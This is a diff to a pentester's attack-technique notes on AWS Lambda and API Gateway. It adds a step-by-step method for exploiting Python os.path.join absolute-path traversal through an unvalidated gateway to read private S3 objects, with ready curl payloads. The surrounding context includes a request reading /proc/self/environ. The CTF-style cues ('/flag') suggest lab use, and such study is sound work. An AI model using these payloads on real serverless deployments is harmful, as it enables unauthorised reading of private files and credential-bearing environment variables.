@@ -1,6 +1,6 @@
 # AWS Lambda & API Gateway Attack Techniques
 
-> **Pre-req:** `source $HOME/Pentester/ptTools/venvHTB/bin/activate`
+> **Pre-req:** `source /opt/venvTools/bin/activate`
 
 ### Lambda Source Code Extraction [added: 2026-04]
 - **Tags:** #AWS #Lambda #GetFunction #SourceCode #SecretDiscovery #CodeReview #ServerlessRecon
@@ -131,3 +131,33 @@
   # Or file read
   GET /prod/system?file=/proc/self/environ
   ```
+
+---
+
+### Python os.path.join() Absolute Path Traversal in Lambda [added: 2026-05]
+- **Tags:** #Lambda #PathTraversal #PythonOsPathJoin #ServerlessMisconfig #APIGW #S3Read #AbsolutePathBypass #LFI #ServerlessLFI #InputValidation
+- **Trigger:** Lambda constructs an S3 key (or file path) using `os.path.join("prefix", user_input)` and only filters `..` — not absolute paths; a second API Gateway endpoint with no schema validation exists alongside the primary validated one; source code available (ZIP download, Lambda source leak, etc.)
+- **Prereq:** User-controlled input reaches `os.path.join()` as the second argument; filter checks only for `..`; access to an API Gateway endpoint without request schema validation (look for multiple APIGW IDs in CloudFormation/source); target file path in S3 or filesystem known
+- **Yields:** Read of arbitrary S3 objects (or local files) outside the intended prefix; flag, config files, or private templates stored in a separate private bucket
+- **Opsec:** Low (appears as normal Lambda invocation; S3 GetObject on the private bucket path)
+- **Context:** Python's `os.path.join(a, b)` discards `a` entirely when `b` is an absolute path starting with `/`. A filter checking only for `..` (relative traversal) will miss `template="/flag"` → `os.path.join("templates", "/flag.txt")` → `/flag.txt`. When multiple API Gateways front the same Lambda, the one without schema validation allows arbitrary JSON — use it to send the unvalidated absolute path. Pattern: look for `[APIGW-2]` or a second execute-api endpoint in the source code, CloudFormation stack exports, or error messages.
+- **Payload/Method:**
+```bash
+# Step 1: Identify the unvalidated API Gateway (no schema validation)
+# Look in source code/CloudFormation for multiple execute-api endpoints:
+grep -r "execute-api" ./source/ 2>/dev/null
+# Two GATEWAYs → one has requestValidator/schemaValidation, one does not
+
+# Step 2: Send absolute path as template parameter to bypass filter
+# Note: use the APIGW-2 endpoint (no validation)
+curl -s -X POST \
+  https://<APIGW-2-ID>.execute-api.us-east-1.amazonaws.com/prod/register \
+  -H "Content-Type: application/json" \
+  -d '{"token":"<valid-token>","template":"/flag","name":"test"}'
+# os.path.join("templates", "/flag.txt") → /flag.txt → reads private S3 object
+
+# Step 3: Retrieve output (flag rendered in response body or linked artifact)
+# Response may include a card_url — fetch it to get the traversed file contents
+CARD_URL=$(curl -s ... | jq -r '.card_url')
+curl -s "$CARD_URL"
+```
